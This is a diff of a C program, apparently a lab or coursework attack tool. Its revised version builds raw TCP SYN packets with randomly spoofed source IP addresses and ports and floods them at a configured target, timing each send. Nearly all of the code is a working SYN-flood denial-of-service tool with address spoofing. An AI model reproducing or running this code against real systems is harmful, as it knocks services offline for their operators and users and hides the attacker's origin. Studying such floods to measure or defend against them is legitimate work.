@@ -1,157 +1,223 @@
+#include <stdlib.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <string.h>
+#include <errno.h>
+#include <time.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
+
 #include "Attack.h"
 
 
-void set_ip_layer(struct iphdr *ip_header)
+uint16_t calculate_ip_checksum(struct iphdr *ip)
 {
-    ip_header->ihl = 5;
-    ip_header->version = 4;
-    ip_header->tos = 0;
-    ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
-    ip_header->id = htons(1);
-    ip_header->frag_off = 0;
-    ip_header->ttl = 64;
-    ip_header->protocol = IPPROTO_TCP;
-    ip_header->check = 0;
-    ip_header->saddr = inet_addr(S_IP);
-    ip_header->daddr = inet_addr(D_IP);
+    uint32_t sum = 0;
+    uint16_t *ip_hdr = (uint16_t*)ip;
 
-    uint32_t checksum = 0;
-    uint16_t *ipPtr = (uint16_t*)ip_header;
-
-    int i = 0;
-    for(i = 0; i < sizeof(struct iphdr)/2; i++)
+    for (int i = 0; i < (ip->ihl * 2); i++)
     {
-        checksum += *(ipPtr++);
+        sum += ntohs(ip_hdr[i]);
     }
 
-    while(checksum >> 16)
+    while (sum >> 16) 
     {
-        checksum = (checksum & 0xFFFF) + (checksum >> 16);
+        sum = (sum & 0xFFFF) + (sum >> 16);
     }
 
-    ip_header->check = (uint16_t)(~checksum);   
+    sum = ~sum;
+
+    return (uint16_t)sum;
 }
 
 
-void set_tcp_layer(struct tcphdr *tcp_header)
+uint16_t calculate_tcp_checksum(struct iphdr *ip, struct tcphdr *tcp)
 {
-    tcp_header->source = htons(S_PORT);
-    tcp_header->dest = htons(D_PORT);
-    tcp_header->seq = htonl(0);
-    tcp_header->ack_seq = 0;
-    tcp_header->res1 = 0;
-    tcp_header->doff = 5;
-    tcp_header->fin = 0;
-    tcp_header->syn = 1;
-    tcp_header->rst = 0;
-    tcp_header->psh = 0;
-    tcp_header->ack = 0;
-    tcp_header->urg = 0;
-    tcp_header->res2 = 0;
-    tcp_header->window = htons(8192);
-    tcp_header->check = 0;
-    tcp_header->urg_ptr = 0;
+    uint32_t sum = 0;
 
-    uint32_t checksum = 0;
-    uint16_t *tcpPtr = (uint16_t*)tcp_header;
+    sum += (ip->saddr >> 16) & 0xFFFF;
+    sum += ip->saddr & 0xFFFF;
+    sum += (ip->daddr >> 16) & 0xFFFF;
+    sum += ip->daddr & 0xFFFF;
+    sum += htons(IPPROTO_TCP);
+    sum += htons(sizeof(struct tcphdr));
 
-    checksum += (inet_addr(S_IP) >> 16) & 0xFFFF;
-    checksum += (inet_addr(S_IP) & 0xFFFF);
-    checksum += (inet_addr(D_IP) >> 16) & 0xFFFF;
-    checksum += inet_addr(D_IP) & 0xFFFF;
-    checksum += htons(IPPROTO_TCP);
-    checksum += htons(sizeof(struct tcphdr));
-
-    int i = 0;
-    for(i = 0; i < sizeof(struct tcphdr)/2; i++)
+    uint16_t *tcp_hdr = (uint16_t*) tcp;
+    for (int i = 0; i < sizeof(struct tcphdr) / 2; i++)
     {
-        checksum += *(tcpPtr++);
+        sum += ntohs(tcp_hdr[i]);
     }
 
-    while(checksum >> 16)
-    {
-        checksum = (checksum & 0xFFFF) + (checksum >> 16);
+    if (tcp->doff * 4 > sizeof(struct tcphdr)) {
+        sum += ntohs(*(uint16_t*) ((char*) tcp + sizeof(struct tcphdr)));
     }
 
-    tcp_header->check = (uint16_t)(~checksum);
+    while (sum >> 16)
+    {
+        sum = (sum & 0xFFFF) + (sum >> 16);
+    }
+
+    sum = ~sum;
+
+    return (uint16_t)sum;
+}
+
+
+int get_random_port()
+{
+    return rand() % (65535 - 1024 + 1) + 1024;
+}
+
+
+char* get_random_ipv4(int sockfd, FILE *file)
+{
+    char *ipv4 = NULL;
+    ipv4 = (char*)calloc(16, sizeof(char));
+    if(!ipv4)
+    {
+        perror("calloc() failed");
+        close(sockfd);
+        fclose(file);
+        exit(errno);
+
+    }
+    sprintf(ipv4, "%d.%d.%d.%d", (rand() % 256), (rand() % 256), (rand() % 256), (rand() % 256));
+    return ipv4;
+}
+
+
+void set_ip_layer(struct sockaddr_in *target, struct iphdr *ip, int sockfd, FILE *file)
+{
+    ip->version = 4;
+    ip->ihl = 5;
+    ip->tos = 0;
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    ip->id = htons(1);
+    ip->frag_off = htons(0);
+    ip->ttl = 64;
+    ip->protocol = IPPROTO_TCP;
+
+    char *ipv4 = NULL;
+    ipv4 = get_random_ipv4(sockfd, file);
+    ip->saddr = inet_addr(ipv4);
+    free(ipv4);
+
+    ip->daddr = target->sin_addr.s_addr;
+    ip->check = calculate_ip_checksum(ip);
+}
+
+
+void set_tcp_layer(struct sockaddr_in *target, struct iphdr *ip, struct tcphdr *tcp)
+{
+    tcp->source = htons(get_random_port());
+    tcp->dest = target->sin_port;
+    tcp->seq = htonl(0);
+    tcp->ack_seq = 0;
+    tcp->doff = 5;
+    tcp->fin = 0;
+    tcp->syn = 1;
+    tcp->rst = 0;
+    tcp->psh = 0;
+    tcp->ack = 0;
+    tcp->urg = 0;
+    tcp->window = htons(8192);
+    tcp->urg_ptr = 0;
+    tcp->check = calculate_tcp_checksum(ip, tcp);
 }
 
 
 
-int main(int argc, char **argv)
+
+int main(int argc, char *argv[])
 {
+    srand(time(NULL));
+
     int sock = 0;
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if(!sock)
+    if(sock <= 0)
     {
-        fprintf(stderr, "socket() failed\n");
+        perror("socket() failed");
         exit(errno);
-    }
+    }   
 
-    FILE *file = NULL;
-    file = fopen(SYN_TIMES_FILE, "w");
-    if(!file)
+    int buffer_size = 1024 * 1024;
+    if(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(int)) < 0)
     {
-        fprintf(stdout, "foepn() failed\n");
+        perror("setsockopt() failed");
         close(sock);
         exit(errno);
     }
 
+
+    FILE *file = NULL;
+    file = fopen(RESULTS_FILE, "w");
+    if(file == NULL)
+    {
+        perror("fopen() failed");
+        close(sock);
+        exit(errno);
+    }
+
+    struct sockaddr_in target_addr = {0};
+    memset(&target_addr, 0, sizeof(struct sockaddr_in));
+    target_addr.sin_family = AF_INET;
+    target_addr.sin_addr.s_addr = inet_addr(TARGET_IP_ADDR);
+    target_addr.sin_port = htons(TARGET_PORT);
+
     struct iphdr ip_header = {0};
     memset(&ip_header, 0, sizeof(struct iphdr));
-    set_ip_layer(&ip_header);
 
     struct tcphdr tcp_header = {0};
     memset(&tcp_header, 0, sizeof(struct tcphdr));
-    set_tcp_layer(&tcp_header);
 
-    struct sockaddr_in target_addr = {0};
-    memset(&target_addr, 0, sizeof(struct sockaddr));
-    target_addr.sin_family = AF_INET;
-    target_addr.sin_addr.s_addr = ip_header.daddr;
-    target_addr.sin_port = htons(D_PORT);
-
-    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
-    memset(packet, 0, sizeof(packet));
-    memcpy(packet, &ip_header, sizeof(struct iphdr));
-    memcpy(packet + sizeof(struct iphdr), &tcp_header, sizeof(struct tcphdr));
-
-    struct timeval before_send = {0}, after_send = {0};
-    memset(&before_send, 0, sizeof(struct timeval));
-    memset(&after_send, 0, sizeof(struct timeval));
-
-
-    double avg = 0.0;
-    size_t bytes_sent = 0;
+    char syn_packet[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
+    memset(syn_packet, 0, sizeof(syn_packet));
 
     int i = 0, j = 0;
+    size_t sent = 0;
+
+    double avg = 0.0;
+    struct timeval start = {0}, end = {0};
+
     for(i = 0; i < NUM_ITERATIONS; i++)
     {
         for(j = 0; j < NUM_PACKETS; j++)
-        {   
-            gettimeofday(&before_send, NULL);
-            bytes_sent = sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
-            gettimeofday(&after_send, NULL);
+        {
+            set_ip_layer(&target_addr, &ip_header, sock, file);
+            set_tcp_layer(&target_addr, &ip_header, &tcp_header);
 
-            if(bytes_sent < 0)
+            memset(syn_packet, 0, sizeof(syn_packet));
+            memcpy(syn_packet, &ip_header, sizeof(ip_header));
+            memcpy(syn_packet + sizeof(ip_header), &tcp_header, sizeof(tcp_header));
+
+            memset(&start, 0, sizeof(struct timeval));
+            memset(&end, 0, sizeof(struct timeval));
+            
+            gettimeofday(&start, NULL);
+            sent = sendto(sock, syn_packet, sizeof(ip_header) + sizeof(tcp_header), 0, (struct sockaddr*)&target_addr, sizeof(target_addr));
+            gettimeofday(&end, NULL);
+
+            if(sent <= 0)
             {
-                fprintf(stderr, "sendto() failed\n");
+                perror("sendto() failed");
+                close(sock);
+                fclose(file);
                 exit(errno);
             }
 
-            avg += ((after_send.tv_sec - before_send.tv_sec) + ((after_send.tv_usec - before_send.tv_usec) / 1000000.0));
+            avg += (end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0;
 
-            fprintf(file, "%d %f\n", ((i * NUM_PACKETS) + j), ((after_send.tv_sec - before_send.tv_sec) + ((after_send.tv_usec - before_send.tv_usec) / 1000000.0)));
-            fflush(file);
+            fprintf(file, "%d %f\n", (i * NUM_PACKETS + j), ((end.tv_sec - start.tv_sec) + (end.tv_usec - start.tv_usec) / 1000000.0));
         }
-        fprintf(stdout, "Sent %d packets\n", ((i + 1) * NUM_PACKETS));
     }
 
-    avg /= (NUM_ITERATIONS * NUM_PACKETS);
+    avg /= NUM_ITERATIONS * NUM_PACKETS;
     fprintf(file, "%f", avg);
-    fflush(file);
 
+    close(sock);
     fclose(file);
-    
+
     return 0;
 }
